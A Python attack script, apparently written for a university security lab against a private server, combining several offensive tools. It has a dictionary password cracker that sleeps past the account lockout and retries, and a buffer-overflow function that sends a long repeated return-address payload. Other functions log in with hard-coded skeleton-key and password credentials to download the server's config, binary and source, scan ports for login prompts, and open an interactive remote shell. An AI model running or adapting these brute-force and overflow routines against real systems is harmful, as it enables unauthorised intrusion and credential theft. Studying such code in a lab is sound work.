#!/usr/bin/env python3
import re
import socket
import time
import datetime
#import sys
#sys.stdout = open('port.out', 'w')

HOST = '192.168.1.10'
PORT = 10247
# HOST = '127.0.0.1'
SKELETONKEY = 'Passepartout'
BYTES = 100000
CRUZID = 'bosdhill\n'

def create_dict():
     passwords = []
     fp = open("dictionary.txt", "r")
     for _, line in enumerate(fp):
          passwords.append(line.replace('\n',''))
     return passwords

def print_redirect_url():
     fp = open("buffer_curl_response.html", "r")
     lines = fp.readlines()
     indexof = lines[0].find("URL=\'")
     URL = lines[0][indexof + len("URL=\'"):].split("\'")[0]
     print(URL)

def smash():
     buf = b'<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08<\x8e\x04\x08'
     print("packet",buf)
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((HOST,PORT))
     s.sendall(buf)

def send_data(s, message, value, f):
     print("Sending %s..." % message)
     data = get_data(s, value)
     if f == True:
          fp = open(message, "wb")
          fp.write(data)

def get_data(s, value):
     s.sendall(bytes(value, 'utf-8'))
     time.sleep(1)
     data = s.recv(BYTES)
     return data

def get_config():
     password = "BristolRovers"
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((HOST, PORT))
     send_data(s, "skeleton key", SKELETONKEY, False)
     send_data(s, "username", CRUZID, False)
     send_data(s, "password", password, False)
     send_data(s, "student.dat", "config\n", True)
     s.close()

def get_binary():
     password = "BristolRovers"
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((HOST, PORT))
     send_data(s, "skeleton key", SKELETONKEY, False)
     send_data(s, "username", CRUZID, False)
     send_data(s, "password", password, False)
     send_data(s, "server", "binary\n", True)
     s.close()

def get_source():
     password = "BristolRovers"
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((HOST, PORT))
     send_data(s, "skeleton key", SKELETONKEY, False)
     send_data(s, "username", CRUZID, False)
     send_data(s, "password", password, False)
     send_data(s, "server.c", "source\n", True)
     s.close()

def auto_connect():
     get_config()
     get_binary()
     get_source()

def shell_connect():
     PORT = 10247
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((HOST, PORT))
     print("Sending skeletonkey...")
     s.sendall(bytes(SKELETONKEY, 'utf-8'))
     data = s.recv(BYTES)
     while True:
          x = input(data.decode('unicode-escape'))
          s.sendall(bytes(x, 'utf-8'))
          data = s.recv(BYTES)

# Assuming NO initial lockout
def crack_password(PORT):
     passwords = create_dict()
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((HOST, PORT))
     print("Sending skeletonkey...")
     s.sendall(SKELETONKEY)
     data = s.recv(BYTES)
     print("Data received: %s" % data)
     print("Sending username...")
     s.sendall(CRUZID)
     data = s.recv(BYTES)
     print("Received: %s" % data)
     i = -1
     while True:
          if data == 'Password: ':
               i += 1
               print("\tSending password %s..." % passwords[i])
               s.sendall(passwords[i])
               data = s.recv(BYTES)
               print("Received: %s" % data)
               if data == 'Incorrect password, goodbye.\n':
                    print("\tThe password %s was incorrect. :C" % passwords[i])
                    s.close()
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    print("\tReconnecting to %s over port %d..." % (HOST, PORT))
                    s.connect((HOST, PORT))
                    print("Sending skeletonkey...")
                    s.sendall(SKELETONKEY)
                    data = s.recv(BYTES)
                    print("Data received: %s" % data)
                    print("\tSending username...")
                    s.sendall(CRUZID)
                    data = s.recv(BYTES)
                    print("Received: %s" % data)
               else:
                    print("Password cracked! Password is %s" % passwords[i])
                    break
          elif data == 'Too many failed login attempts, account is locked for the next 600 seconds, goodbye.\n':
               print("\tOut of tries!")
               print("\t\tSleep for %d seconds at %s" % (602, str(datetime.datetime.now())))
               s.close()
               time.sleep(602)
               s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
               print("\t\tReconnecting to %s over port %d..." % (HOST, PORT))
               s.connect((HOST, PORT))
               print("Sending skeletonkey...")
               s.sendall(SKELETONKEY)
               data = s.recv(BYTES)
               print("Data received: %s" % data)
               print("\t\tSending username...")
               s.sendall(CRUZID)
               data = s.recv(BYTES)

def try_ports():
     fp = open("out", "r")
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     for _, line in enumerate(fp):
          port = re.findall("[0-9]{5}", line)
          PORT = int(port[0])
          s.connect((HOST, PORT))
          s.sendall(SKELETONKEY)
          time.sleep(2)
          data = s.recv(BYTES)
          s.sendall(CRUZID)
          data = s.recv(BYTES)
          if data == 'Password: ':
               print('Received %s from port %d' % (repr(data), PORT))
               crack_password(PORT)

if __name__ == "__main__":
#     crack_password(10247)
	shell_connect()
     # auto_connect()
     # smash()
     # print_redirect_url()